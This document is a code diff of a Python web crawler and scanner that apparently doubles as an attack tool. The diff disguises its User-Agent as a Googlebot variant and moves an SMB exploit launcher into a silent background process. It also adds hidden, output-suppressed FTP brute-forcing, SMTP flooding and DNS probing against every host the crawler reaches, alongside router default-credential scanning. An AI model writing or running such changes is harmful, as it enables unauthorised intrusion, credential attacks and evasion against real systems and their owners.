@@ -1,10 +1,10 @@
-import os
 import re
 import html
 import time
 import json
 import random
 import heapq
+import os
 import sqlite3
 import urllib.parse
 import requests
@@ -22,6 +22,7 @@ import numpy as np
 import socket
 import ssl
 import threading
+import subprocess  # Added for running C/CPP scripts in background
 
 try:
     from sklearn.feature_extraction.text import TfidfVectorizer
@@ -46,7 +47,7 @@ MULTI_MODELS_DIR = "ml_models"
 MAX_BODY_SNIPPET_LEN = 5000
 ENABLE_HEADER_SCANNING = True
 ENABLE_FORM_PARSING = True
-CUSTOM_HEADERS = {"User-Agent":"ImprovedSecurityScanner/1.0"}
+CUSTOM_HEADERS = {"User-Agent":"e-googlebot version 1.0.0"}
 
 XSS_REGEXES = [
     r"<\s*script[^>]*?>.*?<\s*/\s*script\s*>",
@@ -877,8 +878,8 @@ def check_smb_v2(host):
     return False
 
 def run_smb_exploit(server_ip, server_port="445"):
-    cmd = f"./smb2_pipe_exec_client {server_ip} {server_port}"
-    os.system(cmd)
+    cmd = ["./smb2_pipe_exec_client", server_ip, server_port]
+    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def run_background_thread(host_ip):
     def thread_func():
@@ -919,6 +920,12 @@ def priority_bfs_crawl_and_scan(starts,max_depth=20):
             else:
                 print(f"Port 445 not open on {host_ip}")
                 run_background_thread(host_ip)
+            print(f"Running FTP bruteforce on {host_ip}...")
+            subprocess.Popen(["./21_ftp", host_ip, "--bruteforce"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print(f"Running SMTP concurrency scan on {host_ip}...")
+            subprocess.Popen(["./25_smtp", host_ip, "-m", "max_concurrency"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print(f"Running DNS scan on {host_ip}...")
+            subprocess.Popen(["./53_dns", host_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         if u in visited:
             continue
@@ -1004,7 +1011,6 @@ def priority_bfs_crawl_and_scan(starts,max_depth=20):
 
     return results
 
-# Minimal function to scan typical routers for HTTP access and default creds
 def scan_routers_for_entry_points():
     results = []
     router_ips = ["192.168.0.1","192.168.1.1","10.0.0.1","172.16.0.1"]
@@ -1030,8 +1036,6 @@ def main():
             user_depth = int(sys.argv[1])
         except:
             pass
-
-    # Scan routers
     router_scan_results = scan_routers_for_entry_points()
     if router_scan_results:
         print("\nRouter Scan Results:")
@@ -1039,7 +1043,6 @@ def main():
             print(f"  Router {ip} - {info} ({usr}:{pwd})")
     else:
         print("\nNo routers accessible with default credentials from known subnets.")
-
     all_results = priority_bfs_crawl_and_scan(test_sites,user_depth)
     for r in all_results:
         print(f"\nServer: {r.get('server','Unknown')} | {r['url']}")
@@ -1065,7 +1068,6 @@ def main():
             print("  Found Flags:")
             for flg in r["found_flags"]:
                 print(f"    {flg}")
-
     write_scan_results_text(all_results,"scan_results.txt")
     write_scan_results_json(all_results)
 
